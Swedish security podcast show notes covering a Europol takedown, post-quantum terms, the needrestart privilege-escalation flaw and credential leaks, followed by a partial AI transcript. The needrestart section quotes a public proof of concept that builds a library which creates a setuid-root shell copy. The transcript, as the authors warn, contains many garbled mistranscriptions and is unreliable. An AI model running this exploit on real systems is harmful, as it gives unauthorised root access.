---
date: '2024-12-09T19:16:00'
tags:
- ostrukturerat
- CI/CD
title: 'Säkerhetspodcasten #273 - Ostrukturerat V.50'
---
## Lyssna
* [mp3](https://traffic.libsyn.com/secure/sakerhetspodcasten/2024-12-04_Sakerhetspodcasten.mp3?dest-id=117848), längd: 35:05

## Panelen

Johan, Mattias, Peter och Rickard tar sig vad som har hänt det senaste!

Jesper är frånvarande pga. att han är bad ass säkerhetspresentatör i Stockholm!

## Ämnen

* Europol slår till mot MATRIX
  * Off-topic: Säkra meddelandeprotokoll och kvantar
  * Off-topic: kvantkrypto-coinet
* WiFi hoppandes spioner
* Needsrestart
* Credential Guard
* Credential leaks hackas jättesnabbt

## Europol slår till mot MATRIX

Ett ganska stort kriminelt nätverk blev avkrypterat av Europol i månader, och sen nerstängt.
* MATRIX även ökänt som: Mactrix, Totalsec, X-quantum, Q-safe.
* **Observera**: _Ingen koppling_ till den decentralizerade meddelande appen `matrix.org`

Länkar:
* [matrix.org: An unrelated cybercriminal network named MATRIX was taken down](https://matrix.org/blog/2024/12/unrelated-cybercriminal-network-taken-down/)
* [thehackernews: Europol Dismantles Criminal Messaging Service MATRIX in Major Global Takedown](https://thehackernews.com/2024/12/europol-dismantles-criminal-messaging.html)
* [Europol: International operation takes down another encrypted messaging service used by criminals](https://www.europol.europa.eu/media-press/newsroom/news/international-operation-takes-down-another-encrypted-messaging-service-used-criminals) -
  _It is not the first time and will not be the last time that authorities are able to read criminals’ messages in real time_

> Authorities are staying on top of the encrypted messaging services that criminals use to undertake their activities.
> A joint investigation team (JIT) involving French and Dutch authorities has taken down another sophisticated encrypted messaging service, MATRIX.
> For three months, authorities were able to monitor the messages from possible criminals, which will now be used to support other investigations.
> During a coordinated operation supported by Eurojust and Europol, the messaging service was taken down by Dutch and French authorities and
> follow-up actions were executed by their Italian, Lithuanian and Spanish counterparts.

## Off-topic: Säkra meddelandeprotokoll och kvantar

Vad beyder alla djäkla ord:

* `Post Quantum Crypto`: "Kvantsäkert".
  Skall kunna stå emot att
  `AES-256` och en massa nya hipster hashar, handskakningar.
* `Forward Secrecy`: "Frammåtsäkert", typ Diffie Hellman, ECDHE-aktigt.
* `Rekeying`: "Bakåtsäkert" (Backward Secrecy?).
  Kasta bort gamla nycklar, om du tillfälligt är hackad skall du självläka.
  Det vill säga, givet vissa antaganden, kan du kanske lyckas överge en röjd nyckel eller en nyckel som skall röjas.
* `Quantum entanglement`: entanglade kvantar.
  Principen om att magiskt få två partiklar A och B att hänga ihop.
  I en extremt teoretiskt science fiction modell kan man kommunicera via sina kvantar.
  En app i en mobiltelefon kan absolut inte hålla i en entanglad app och kommunicera med en annan app via den ;)
* `Key signing party`
  - att mötas för säker betrodd `enrollment` / `key exchange`.
  - undvik att kalla det `key party` eftersom...
    ej att förväxlas med en festlig aktivitet mellan vuxna partner
    som utövas under samtycke och involverar andra nycklar
    (så mycket dumt man kan lära sig om man googlar...)
* `Web of Trust`
  - en typ av `Public Key Infrastructure (PKI)` där alla medlemmar i systemet kan signera/validera nycklar.
  - tillförlitligheten av en nyckel beräknas ut på ett smart och mycket förvirrande system.
  - typ hur bra som helst men vi vanligt folk är lite för dumma för att använda det i praktiken, verkar det som.

Länkar:
* [Apple: iMessage with PQ3 - The new state of the art in quantum-secure messaging at scale](https://security.apple.com/blog/imessage-pq3/)
* [Signal: Technical information](https://signal.org/docs/) - _Specifications and software libraries for developers_
* [Wikipedia: Signal Protocol](https://en.wikipedia.org/wiki/Signal_Protocol)
* [Wikipedia: Key signing party](https://en.wikipedia.org/wiki/Key_signing_party)
* [Wikipedia: Web of trust](https://en.wikipedia.org/wiki/Web_of_trust)
* [Wikipedia: Quantum entanglement](https://en.wikipedia.org/wiki/Quantum_entanglement)

## Off-topic: kvantkrypto-coinet

Kollade in Quantum1Net (`Q1S`) coinet vi nämnde igen lite kort...

* Sajter som försöker mäta trading visar inget på Q1S?
* Dött: Quantum1Net sajten finns inte mer. Whitepaper m.m. finns inte längre.
* Dött: Quantum1Net (Q1S) bounty-trådar på bitcon forum verkar ta slut i 2018.
* Dött: Länkar till youtube videos olistade, så svårt att veta vad de visade.
* Facebook: 2018 sista postningarna om `Q1S`?
  Blandade postningar något år efter det, verkade inte uppenbart handla om `Q1S`.
* ICOARM: för Q1S förvirrar oss coin-noobs;
  - Roadmap: Alla målen skall vara implementerade?
  - Fundingen är både 0% och 100% samtidigt?! `Planned funds: $4,284,840.00`, `Current status: 0% done`, `Cercentage of completion 100%`
* Github närvaron verkar handla om `Q1N` inte `Q1S` och strukturen är underlig, inte så man brukar använda git.
  - Används inte för källkodshantering.
  - Varje huvudrelease har en eget git-repo?
  - Varje minor-rlease har en zip-fil?
  - Github funktionen för releaser används inte.

Länkar:
* [Säkerhetspodcasten avs.120 - Om kvantumkalabalik med Jonathan Jogenfors](https://sakerhetspodcasten.se/posts/sakerhetspodcasten-avs-120-om-kvantumkalabalik-med-jonathan-jogenfors/)
> I dagens avsnitt intervjuas Jonathan Jogenfors om kvantkryptering, kvantdatorsäker kryptering
> (“PQC” Post Quatum Cryptography) och hans twitter-bråk med Quantum1Net.
> I början av podcasten nämner vi synpunkter som vi har fått ta del av från Quantum1Net.
* [ICOARM: quantum1nen Q1S](https://icoarm.com/ico/quantum1net/)
* [Facebook: quantum1net](https://www.facebook.com/quantum1net)
* [github.com/quantum1net](https://github.com/quantum1net)

## WiFi hoppandes spioner

Ryska spioner påstås hoppa via olika grannars nät för att komma inom räckvidd för WiFi-hacking av mål.

Länkar:
* [Wired: Russian Spies Jumped From One Network to Another Via Wi-Fi in an Unprecedented Hack](https://www.wired.com/story/russia-gru-apt28-wifi-daisy-chain-breach/)

## Needsrestart

Ubuntu varit helt osäkert i 10 år!

`needsrestart` hade lätt att missbruka local privligie eskalering från `user` till `root`.

Root äter `PYTHONPATH` från user processer och kör user-processernas `constructor`...

Lite pinsamt fel?

* [Qualys Security Advisory: LPEs in needrestart (CVE-2024-48990, CVE-2024-48991, CVE-2024-48992, CVE-2024-10224, and CVE-2024-11003)](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
* [Low Level: this vulnerability has been hiding for 10 years.](https://www.youtube.com/watch?v=CDtIS8XaJDY) - `video`
* [Brodie Robertson: Ubuntu's Decade Long Privilege Escalation Bug](https://www.youtube.com/watch?v=0OXcJ5uAdQg) - `video`
* [github.com/liske/needrestart](https://github.com/liske/needrestart)
* [github.com/makuga01/CVE-2024-48990-PoC](https://github.com/makuga01/CVE-2024-48990-PoC)

``` bash
# makuga01/CVE-2024-48990-PoC/start.sh
gcc -shared -fPIC -o "$PWD/importlib/__init__.so" lib.c
PYTHONPATH="$PWD" python3 e.py
```

``` c
// makuga01/CVE-2024-48990-PoC/lib.c
static void a() __attribute__((constructor));
void a() {
 setuid(0);
 setgid(0);
 const char *shell = "cp /bin/sh /tmp/poc; chmod u+s /tmp/poc &";
 system(shell);
}
```


## Credential Guard

* [SANS ICS: Credential Guard and Kerberos delegation](https://isc.sans.edu/diary/Credential%20Guard%20and%20Kerberos%20delegation/31488)

> Credential Guard completely blocks Kerberos Unconstrained delegation,
> which effectively blocks us from extracting the TGT (and will break
> any application that relies on this feature as well!).

> Credential Guard also blocks NTLMv1 completely

* [Microsoft: Credential Guard overview](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/)
* [Microsoft Mechanics: Token theft protection with Microsoft Entra, Intune, Defender XDR & Windows](https://www.youtube.com/watch?v=gPcNlm0CyOw) - `video`

## Credential leaks hackas jättesnabbt

Clutch security testade hur snabbt läckta creds exploiteras:
* Under 1 minut: **AWS nycklar**
* 1 minut: **Github Personal Access Token (PAT)**
* 4 minuter: **Okta API Token**
* 5 minuter: **Stripe API key**, **RDS Credentials**

Uppenbart har angriparna bottar och är vansinnigt mycket snabbare än ett devops/devsecops team efter att de gjort bort sig.

Deras tes är att "Secret Rotation är en illusion" baserat på hur mycket snabbare angriparna är.

Men, man kan i vart fall vara glad att det finns goda skälar där ute:

> One particularly sobering moment was when a Reddit user commented on a post we created:
> “Hey, I think you accidentally shared some sensitive keys here.”
> It was a polite nudge but highlighted just how publicly visible
> these mistakes can be—and how easily they can be overlooked.

Ett potentiellt riktigt bra argument för secrets scanning i pre-commit hooks.
Vi länkar också till `Theo-t3.gg` video om varför pre-commit hooks ofta är dåligt/impopulärt.

`TL;DR`: se till till att dina pre-commits hook är blixtsnabba, och ha även kollen i CI/CD.

Länkar:
* [Clutch: The Day We Unveiled the Secret Rotation Illusion](https://www.clutch.security/blog/the-day-we-unveiled-the-secret-rotation-illusion)
* [Theo - t3․gg: The dangers of precommit hooks](https://www.youtube.com/watch?v=LL01pLjcR5s) - `video`


## AI transkribering

_AI försöker förstå oss... Ha överseende med galna feltranskriberingar._

`1 00:00:00,000 --> 00:00:02,680`
Hej och välkommen till Säkerhetspodcasten.



`2 00:00:02,780 --> 00:00:04,400`
Jag som pratar heter Johan Ryberg Möller.



`3 00:00:04,520 --> 00:00:06,040`
Med mig har jag Peter Magnusson.



`4 00:00:06,240 --> 00:00:08,500`
C-tidig AB-testning.



`5 00:00:08,780 --> 00:00:10,000`
Och Mattias Svidhage.



`6 00:00:10,260 --> 00:00:10,680`
What?



`7 00:00:11,120 --> 00:00:12,320`
Och Rickard Bofors.



`8 00:00:12,740 --> 00:00:12,980`
Ja.



`9 00:00:13,400 --> 00:00:15,560`
Jesper är inte här.



`10 00:00:15,880 --> 00:00:17,700`
Han är i Stockholm och gör något dumt.



`11 00:00:18,440 --> 00:00:18,800`
Tror vi.



`12 00:00:19,480 --> 00:00:22,960`
Vi ska nämna att det är fjärde december när vi spelar in detta.



`13 00:00:23,820 --> 00:00:24,780`
Snart kommer tomten.



`14 00:00:25,160 --> 00:00:25,760`
Ja, precis.



`15 00:00:25,760 --> 00:00:26,960`
Snart blir det fyra och sånt.



`16 00:00:27,780 --> 00:00:28,940`
Vi är sponsrade av några.



`17 00:00:28,940 --> 00:00:30,200`
Jag heter Lusse Buller.



`18 00:00:31,580 --> 00:00:34,300`
Andra viktiga nyheter ska vi också prata om i det här avsnittet.



`19 00:00:34,420 --> 00:00:37,960`
Men innan dess så ska vi nämna Shored som finns på Shored.se.



`20 00:00:38,080 --> 00:00:40,120`
Och Bordforskningsallting som finns på Bordfors.se.



`21 00:00:40,360 --> 00:00:43,320`
Och 0x4a som finns på 0x4a.se.



`22 00:00:43,600 --> 00:00:45,520`
Vi finns på Säkerhetspodcasten.se.



`23 00:00:45,600 --> 00:00:48,680`
Och där finns också alla show notes som är värda en läsning.



`24 00:00:49,400 --> 00:00:52,860`
Nu för tiden, alltså är de transkriberade av Google eller någonting?



`25 00:00:53,000 --> 00:00:53,760`
Ja, men sådant.



`26 00:00:54,220 --> 00:00:56,880`
Kolla in på transkriberingen av den senaste.



`27 00:00:56,880 --> 00:00:58,800`
Den är guld.



`28 00:00:58,940 --> 00:01:01,060`
Men där finns alla länkar och sånt om vi pratar om grejer.



`29 00:01:01,300 --> 00:01:01,580`
Det är bra.



`30 00:01:03,560 --> 00:01:06,140`
Vad med SecureFest, CFP? Skicka in.



`31 00:01:07,200 --> 00:01:08,280`
Det är vad det är för plugs.



`32 00:01:08,480 --> 00:01:09,720`
Det här är ett ostrukturerat avsnitt.



`33 00:01:09,920 --> 00:01:10,280`
Yay\!



`34 00:01:10,620 --> 00:01:12,920`
Det är nästan strukturerat så här långt.



`35 00:01:13,000 --> 00:01:16,420`
Men släpper ni biljetter för övrigt till en sån här SecureFest?



`36 00:01:16,560 --> 00:01:17,120`
Ja, det är en bra fråga.



`37 00:01:17,700 --> 00:01:22,420`
Nej, men de kommer komma precis i början av nästa år tror jag är planen här.



`38 00:01:22,740 --> 00:01:24,180`
Typ i januari-ish.



`39 00:01:24,560 --> 00:01:26,040`
Oj, det låter nästan tydligt.



`40 00:01:26,040 --> 00:01:28,500`
Så, det är när ni blir proxiga på det här, eller?



`41 00:01:28,500 --> 00:01:28,620`
Ja.



`42 00:01:28,620 --> 00:01:28,860`
Det är dags.



`43 00:01:28,940 --> 00:01:31,940`
Det är dags att sälja en djur så att du är redo när det kommer.



`44 00:01:32,100 --> 00:01:32,500`
Exakt.



`45 00:01:32,900 --> 00:01:36,120`
Nej, jag tror att där i fallgården, januari-februari, där släpper vi.



`46 00:01:36,200 --> 00:01:37,300`
Jag vet inte exakt om det.



`47 00:01:37,320 --> 00:01:38,140`
Någon månad.



`48 00:01:38,420 --> 00:01:40,240`
Någon gång i Q1, typ.



`49 00:01:41,060 --> 00:01:41,460`
Hoppningshus.



`50 00:01:42,280 --> 00:01:43,040`
Då kommer de.



`51 00:01:43,260 --> 00:01:46,180`
Men innan dess så ska vi gräva ner oss i lite säkerhetsnyheter.



`52 00:01:46,460 --> 00:01:46,700`
Yay\!



`53 00:01:47,060 --> 00:01:51,120`
Och vi kan väl ta och börja med en tur in i The Matrix.



`54 00:01:51,240 --> 00:01:52,180`
The Matrix.



`55 00:01:53,640 --> 00:01:54,000`
Ja.



`56 00:01:54,600 --> 00:01:57,000`
Det här är ju en...



`57 00:01:57,000 --> 00:01:58,820`
Jag höll på att säga att det känns som att vi har hört den.



`58 00:01:58,820 --> 00:02:03,140`
Den förr, om man tänker på Encrochat och de här...



`59 00:02:03,140 --> 00:02:04,200`
Sky, ICC.



`60 00:02:04,700 --> 00:02:06,880`
Ska du säga att det här inte är någon Keanu Reeves, alltså?



`61 00:02:07,080 --> 00:02:08,580`
Den handlar inte om Keanu Reeves.



`62 00:02:09,040 --> 00:02:15,060`
Utan om tjecka telefoner som kopplar upp sig i ett nätverk och pratar krypterat



`63 00:02:15,060 --> 00:02:19,320`
som brottslingar kan få köpa för dyra bitcoins.



`64 00:02:20,260 --> 00:02:21,960`
Var det inte så att de hittade en telefon?



`65 00:02:22,640 --> 00:02:24,100`
Jag har inte...



`66 00:02:24,100 --> 00:02:24,980`
Det var så det började.



`67 00:02:25,100 --> 00:02:25,520`
Ja, vad bra.



`68 00:02:25,980 --> 00:02:28,740`
Det var faktiskt länge sedan, 2021.



`69 00:02:28,820 --> 00:02:32,620`
Så var det en holländsk dude som tänkte ta livet av en journalist.



`70 00:02:32,840 --> 00:02:36,580`
Men jag kan inte riktigt till bakgrunderna, för det var en holländsk artikel som inte jag förstod.



`71 00:02:37,000 --> 00:02:40,040`
Men de tog honom i alla fall, utan att han hade dödat den här journalisten.



`72 00:02:40,540 --> 00:02:42,920`
Och de upptäckte att han hade en telefon på sig.



`73 00:02:43,000 --> 00:02:45,420`
Och den telefonen hade en cool app i sig.



`74 00:02:45,720 --> 00:02:47,700`
Och där började storyn.



`75 00:02:49,260 --> 00:02:49,700`
Precis.



`76 00:02:50,660 --> 00:02:51,760`
Lite bakgrund då.



`77 00:02:51,760 --> 00:02:58,140`
Det här är ju Europool tillsammans med franska och holländska och litauiska.



`78 00:02:58,140 --> 00:03:02,900`
Och tyska polismyndigheter som har då gått efter den här.



`79 00:03:03,160 --> 00:03:08,140`
Och de säger att systemet var väsentligt mer komplext än...



`80 00:03:08,800 --> 00:03:10,360`
Enkrochat och...



`81 00:03:10,360 --> 00:03:11,620`
Enkrochat och de här, ja precis.



`82 00:03:12,320 --> 00:03:15,780`
De hade 40 servrar uppsatta runt omkring i världen.



`83 00:03:15,880 --> 00:03:16,960`
Men jag tror de...



`84 00:03:16,960 --> 00:03:19,220`
Väsentligen var de i Frankrike och Tyskland.



`85 00:03:19,320 --> 00:03:20,960`
Det var den största massan var.



`86 00:03:22,620 --> 00:03:25,700`
Alltså, hur svårt är det att bygga sådana här egentligen?



`87 00:03:25,880 --> 00:03:26,480`
Inte.



`88 00:03:26,480 --> 00:03:28,120`
Det här är Peters origin.



`89 00:03:28,140 --> 00:03:30,480`
Och nu bara bygger allting.



`90 00:03:30,600 --> 00:03:33,520`
För att varenda del av systemet ska jag hela tiden glömma av.



`91 00:03:33,640 --> 00:03:34,540`
Och det ska vara...



`92 00:03:34,540 --> 00:03:36,380`
FN-modellerna och alla ordningar.



`93 00:03:36,500 --> 00:03:37,880`
Och ingen ska komma ihåg någonting.



`94 00:03:38,240 --> 00:03:40,140`
Men du måste ju ha videochatt.



`95 00:03:40,800 --> 00:03:42,360`
Och du måste ha alla coola grejer.



`96 00:03:42,940 --> 00:03:43,880`
Men jag tänker så här.



`97 00:03:44,880 --> 00:03:46,800`
Som jag sa lite innan vi drog igång här.



`98 00:03:46,980 --> 00:03:49,240`
Hur jävla korkade är brottslingarna?



`99 00:03:49,960 --> 00:03:52,620`
Varför liksom...



`100 00:03:52,620 --> 00:03:53,700`
Ja men hoppa på dem här.



`101 00:03:53,800 --> 00:03:56,820`
Jag vet, vi har en specialverktyg här för brottslingar.



`102 00:03:56,820 --> 00:03:58,120`
Bara gissa om polisen.



`103 00:03:58,140 --> 00:03:59,840`
Kommer att inrikta sin span mot den här.



`104 00:04:00,260 --> 00:04:02,600`
Var det inte någon tidigare där liksom...



`105 00:04:02,600 --> 00:04:05,500`
Polisen själva lanserade sin egen chattgrunka?



`106 00:04:05,780 --> 00:04:06,100`
Absolut.



`107 00:04:06,240 --> 00:04:06,860`
Det är supersmidigt.



`108 00:04:07,380 --> 00:04:08,520`
Det finns till och med en bok om det.



`109 00:04:09,340 --> 00:04:12,140`
Det har ju förekommit några gånger att man har...



`110 00:04:13,600 --> 00:04:17,720`
Det var ju någon historia som vi typ missade till förra avsnittet.



`111 00:04:17,800 --> 00:04:18,140`
Någonting då...



`112 00:04:19,060 --> 00:04:21,140`
Det var någon ordning om att man använt mullvad.



`113 00:04:21,800 --> 00:04:24,700`
Också den här ordningen om att man använt sygdon och sånt.



`114 00:04:24,700 --> 00:04:26,140`
Det är ju lite jobbigt när...



`115 00:04:26,140 --> 00:04:27,880`
Vi vet inte att bad guys snuddar.



`116 00:04:28,140 --> 00:04:28,860`
Våra grejer.



`117 00:04:28,940 --> 00:04:32,900`
För då ökar ju risken att myndigheterna gör något järn dött liksom.



`118 00:04:33,160 --> 00:04:38,280`
Så det är ju väldigt snällt av brottslingen att ha sina egna kriminella nätverk.



`119 00:04:38,420 --> 00:04:39,020`
Det är jättebra.



`120 00:04:39,020 --> 00:04:40,120`
Boob-appen AB.



`121 00:04:41,620 --> 00:04:43,280`
Det blir så mycket lättare.



`122 00:04:43,620 --> 00:04:46,300`
Dels blir det så mycket lättare för polisen att plocka dem.



`123 00:04:46,320 --> 00:04:46,900`
Mrs. Fiffelvågel.



`124 00:04:46,900 --> 00:04:53,260`
Och dels så kanske vi kan få våra mest galna politiker att låta bli våra grejer.



`125 00:04:53,540 --> 00:04:54,580`
Ja, precis.



`126 00:04:55,300 --> 00:04:56,700`
Men tänk om barnen.



`127 00:04:56,800 --> 00:04:57,980`
Men det som var coolt med den här var...



`128 00:04:58,140 --> 00:04:59,400`
Peddo-appen AB.



`129 00:05:00,020 --> 00:05:04,460`
Den var ju byggd och ganska sofistikerad som de sa med en massa mer servrar runt omkring i världen.



`130 00:05:04,660 --> 00:05:07,260`
Den var dessutom uttryckligen end-to-end encrypted.



`131 00:05:08,340 --> 00:05:10,520`
Så det räcker ju inte att gå service-side bara.



`132 00:05:10,660 --> 00:05:13,440`
Så de har ju hittat en flå antal inne i protokollet på något sätt.



`133 00:05:13,440 --> 00:05:14,560`
Och det kan vi också säga.



`134 00:05:15,240 --> 00:05:18,440`
Matrix är ju även ett kommunikationsprotokoll för...



`135 00:05:19,020 --> 00:05:25,300`
Låt oss kalla det en öppenspesad social media messaging-grej.



`136 00:05:25,660 --> 00:05:26,260`
Decentralisering.



`137 00:05:26,820 --> 00:05:27,800`
Det är inte samma.



`138 00:05:28,140 --> 00:05:29,740`
Matrix.org är det inte vi pratar om.



`139 00:05:30,120 --> 00:05:31,480`
Och för att göra det ännu tydligare.



`140 00:05:31,920 --> 00:05:35,820`
Så den här appen, det är bara ett av deras namn, den som är Matrix.



`141 00:05:35,940 --> 00:05:37,740`
Den har även kallats för...



`142 00:05:37,740 --> 00:05:39,480`
Mactrix.



`143 00:05:40,060 --> 00:05:41,540`
Alltså samma fast med ett C.



`144 00:05:42,060 --> 00:05:43,080`
Total Sec.



`145 00:05:43,520 --> 00:05:44,540`
X-Quantum.



`146 00:05:45,020 --> 00:05:46,380`
Och Q-Safe.



`147 00:05:46,580 --> 00:05:52,240`
Men det måste vara så att det är svårt att få de vassaste kryptomänniskorna att ta med de här grejerna i tång.



`148 00:05:52,480 --> 00:05:53,780`
Det måste ju vara...



`149 00:05:53,780 --> 00:05:55,820`
Det måste väl vara så att...



`150 00:05:55,820 --> 00:05:56,380`
Liksom...



`151 00:05:56,380 --> 00:06:01,180`
Okej att du får någon IT-kunnig att jobba på det.



`152 00:06:01,400 --> 00:06:07,820`
Men de bästa verkar inte vilja ägna sig åt att bygga kriminella nätverkskommunikationstjänster.



`153 00:06:07,820 --> 00:06:11,740`
Med mindre riskfokuserade jobb kanske.



`154 00:06:11,880 --> 00:06:13,200`
Jag tänkte som du sa, Rickard.



`155 00:06:13,280 --> 00:06:18,660`
Det finns ju enklare sätt för kriminella att kommunicera krypterat som inte har de här riskerna.



`156 00:06:18,660 --> 00:06:19,120`
Ja, exakt.



`157 00:06:19,140 --> 00:06:20,120`
Från PGP.



`158 00:06:20,300 --> 00:06:23,540`
Men det är sagt, det var ju inte så att det är inte hela världen som har använt den här.



`159 00:06:23,680 --> 00:06:25,820`
Utan vid tillfället när de...



`160 00:06:26,380 --> 00:06:27,600`
När de tog dem nu då.



`161 00:06:27,640 --> 00:06:29,140`
För nu är de ju typ nedlagda då.



`162 00:06:29,520 --> 00:06:31,680`
Så fanns det 8000 konton.



`163 00:06:31,700 --> 00:06:33,900`
Jag har gissat på att det finns fler kriminella i Europa än så.



`164 00:06:34,380 --> 00:06:35,220`
Ja, okej.



`165 00:06:35,920 --> 00:06:37,840`
Men de har fan använt de här.



`166 00:06:38,060 --> 00:06:38,800`
Jag gjorde det lite snabbt.



`167 00:06:38,880 --> 00:06:44,900`
De har nämligen under tre månaders tid så har då Europol i den här Joint International Task Force.



`168 00:06:45,000 --> 00:06:45,320`
Eller vad heter det?



`169 00:06:46,640 --> 00:06:47,040`
Operation...



`170 00:06:47,040 --> 00:06:48,440`
Passionflower.



`171 00:06:48,760 --> 00:06:49,480`
Passionflower heter det.



`172 00:06:49,480 --> 00:06:52,840`
I tre månader så har de då lyckats dekryptera medlemmarna.



`173 00:06:53,000 --> 00:06:55,480`
Och på de tre månaderna så har de dekrypterat 2,3 miljoner...



`174 00:06:56,380 --> 00:06:57,060`
På den här medlemmen.



`175 00:06:57,620 --> 00:06:59,020`
Och lite snabb matte då.



`176 00:06:59,180 --> 00:07:03,660`
Om vi slår ut det på 90 dagar, 8000 användare.



`177 00:07:04,060 --> 00:07:08,140`
Så har de i snitt skickat 30 mess per person.



`178 00:07:08,540 --> 00:07:09,800`
Så de är fan aktiva.



`179 00:07:10,040 --> 00:07:10,900`
Mimsen ska ut.



`180 00:07:11,580 --> 00:07:11,800`
Så är det.



`181 00:07:13,080 --> 00:07:14,100`
Ja, det kanske det är.



`182 00:07:14,340 --> 00:07:15,520`
Men jag undrar om det här var...



`183 00:07:15,520 --> 00:07:16,340`
Jag vet inte det.



`184 00:07:16,340 --> 00:07:19,580`
Var det här lite så här sociala medier för bovar?



`185 00:07:19,660 --> 00:07:20,900`
Kunde man hitta varandra på det?



`186 00:07:20,900 --> 00:07:21,160`
Nej, det tror jag inte.



`187 00:07:21,300 --> 00:07:22,240`
Jag trodde det var fokus...



`188 00:07:22,240 --> 00:07:23,660`
Om jag fattar hela rätten.



`189 00:07:23,820 --> 00:07:23,900`
Knarkkandan.



`190 00:07:23,900 --> 00:07:24,200`
Nu ska vi se.



`191 00:07:24,740 --> 00:07:25,740`
Det var...



`192 00:07:25,740 --> 00:07:26,220`
Knarkkandan.



`193 00:07:26,380 --> 00:07:27,320`
En sån...



`194 00:07:27,320 --> 00:07:29,080`
Men det måste ju vara point to point.



`195 00:07:29,220 --> 00:07:30,000`
Inte point...



`196 00:07:30,000 --> 00:07:31,560`
Alltså, business to business.



`197 00:07:32,160 --> 00:07:34,420`
Snarare än till slutkund, va?



`198 00:07:34,860 --> 00:07:35,620`
Ja, herregud ja.



`199 00:07:35,820 --> 00:07:36,300`
Herregud ja.



`200 00:07:37,980 --> 00:07:39,580`
Om det inte var en storkund då kanske.



`201 00:07:39,840 --> 00:07:40,280`
Ja, jo.



`202 00:07:40,980 --> 00:07:41,780`
End-to-end encryption.



`203 00:07:42,960 --> 00:07:43,940`
Exclusive access.



`204 00:07:44,620 --> 00:07:45,180`
Men...



`205 00:07:45,180 --> 00:07:48,960`
Om de har knäckt hela systemet så var det väl inte så jävla mycket end-to-end.



`206 00:07:49,300 --> 00:07:51,440`
Nej, men tanken var väl att det skulle vara end-to-end.



`207 00:07:51,540 --> 00:07:52,560`
Och de gjorde även...



`208 00:07:52,560 --> 00:07:53,560`
När du loggade på...



`209 00:07:53,560 --> 00:07:54,960`
Jag fattade det som att det var för första gången.



`210 00:07:55,000 --> 00:07:55,940`
Så fick du då ett medlande.



`211 00:07:56,380 --> 00:07:57,540`
Som typ välkommen.



`212 00:07:58,160 --> 00:07:59,520`
Och det här välkommetmedlandet sa att



`213 00:07:59,520 --> 00:08:01,460`
för fan, nu har du valt en säker tjänst.



`214 00:08:01,620 --> 00:08:04,140`
Vi har sagt till SkyChat och Encrochat och de där



`215 00:08:04,140 --> 00:08:05,720`
att de har alldeles för mycket sårbarheter.



`216 00:08:05,840 --> 00:08:09,020`
Men vi har haft business i åtta år utan sårbarheter.



`217 00:08:09,280 --> 00:08:10,980`
Så de hade hög svansföring.



`218 00:08:11,260 --> 00:08:12,340`
Och de tog betalt för det här då.



`219 00:08:12,540 --> 00:08:14,280`
Du kunde köpa ett kit då.



`220 00:08:15,180 --> 00:08:16,780`
Någonstans runt 15 000 spänn.



`221 00:08:17,160 --> 00:08:19,080`
Fick du casha upp för en Google Pixel



`222 00:08:19,080 --> 00:08:20,860`
som var då preppad med den här appen.



`223 00:08:21,180 --> 00:08:23,160`
Och sex månaders subscription ingick med det.



`224 00:08:23,260 --> 00:08:25,720`
Sen vad det kostar per månad utöver det, det vet jag inte.



`225 00:08:25,720 --> 00:08:26,320`
Men bara...



`226 00:08:26,380 --> 00:08:29,200`
Bara det då, 8 000 konton, 15 000 spänn per konto.



`227 00:08:29,640 --> 00:08:30,860`
Det är 120 millar.



`228 00:08:31,100 --> 00:08:31,960`
Så att det...



`229 00:08:31,960 --> 00:08:34,780`
Men alltså, säg att man skulle vilja bygga en...



`230 00:08:35,840 --> 00:08:37,280`
Nu behöver det inte vara en crime app.



`231 00:08:37,400 --> 00:08:40,680`
Men en app som skulle ha en snarläckad utbild.



`232 00:08:41,800 --> 00:08:43,360`
Och vi skiter i usability.



`233 00:08:44,120 --> 00:08:45,820`
Men den första hade ju varit...



`234 00:08:45,820 --> 00:08:47,860`
De får para sig optiskt eller något liknande.



`235 00:08:48,000 --> 00:08:48,980`
De är nära varandra.



`236 00:08:50,020 --> 00:08:54,080`
Så att du kräver via användandet



`237 00:08:54,080 --> 00:08:55,860`
så kräver du att det är nyckeln.



`238 00:08:56,380 --> 00:08:59,260`
Utbudet sker och sker säkert.



`239 00:08:59,840 --> 00:09:01,680`
Vi kopplar bort hela den här usability-grejen



`240 00:09:01,680 --> 00:09:03,820`
men jag tycker att jag mässar om du inte har känt till tidigare.



`241 00:09:05,520 --> 00:09:07,240`
Men det är nog ett edge-case.



`242 00:09:07,400 --> 00:09:07,860`
För att tror du inte det?



`243 00:09:08,020 --> 00:09:09,840`
Att bovarna alltid...



`244 00:09:09,840 --> 00:09:12,520`
Ja, kanske i och för sig att de träffar du para-telefonerna



`245 00:09:12,520 --> 00:09:14,120`
och sen kan du dela ut den telefonen.



`246 00:09:14,200 --> 00:09:15,260`
Ja, ett key-party.



`247 00:09:15,640 --> 00:09:18,800`
Ja, ett crime-key-party.



`248 00:09:19,440 --> 00:09:21,500`
På den gamla, heliga PGP-tiden.



`249 00:09:22,140 --> 00:09:25,680`
Eller kopplar vi ihop det med web-avtrast från PGP?



`250 00:09:25,680 --> 00:09:26,220`
Ja, liksom...



`251 00:09:26,220 --> 00:09:28,440`
Jag tycker att det låter som att vi borde ta och bygga den här applikationen.



`252 00:09:28,560 --> 00:09:29,900`
Det är ju verkligen att det finns pengar i det här.



`253 00:09:30,560 --> 00:09:30,920`
Precis.



`254 00:09:31,420 --> 00:09:32,740`
Bov-appen AB.



`255 00:09:33,460 --> 00:09:35,040`
I den tv med bankkedjan.



`256 00:09:36,360 --> 00:09:39,620`
Så sade vi slash crime-app.



`257 00:09:41,200 --> 00:09:41,580`
Underbart.



`258 00:09:42,380 --> 00:09:43,940`
För att göra det här ännu roligare så



`259 00:09:43,940 --> 00:09:46,120`
har ju då



`260 00:09:46,120 --> 00:09:47,780`
Europool faktiskt



`261 00:09:47,780 --> 00:09:49,080`
skojat till det.



`262 00:09:49,300 --> 00:09:50,960`
De har ju satt upp en takedown-notice då.



`263 00:09:53,480 --> 00:09:53,840`
Och



`264 00:09:53,840 --> 00:09:55,060`
går du till den här sajten



`265 00:09:55,060 --> 00:09:55,680`
och tittar,



`266 00:09:56,220 --> 00:09:57,080`
så står det nu,



`267 00:09:57,180 --> 00:10:00,020`
så har de alltså kört en matrix-animering.



`268 00:10:00,520 --> 00:10:01,640`
Och så kommer det att du vet så här



`269 00:10:01,640 --> 00:10:03,320`
ASCII-terminaltecken



`270 00:10:03,320 --> 00:10:05,460`
kloppas, animeras fram en och en.



`271 00:10:05,780 --> 00:10:06,520`
Som säger liksom att



`272 00:10:06,520 --> 00:10:07,820`
nu har vi knäckt den här sajten.



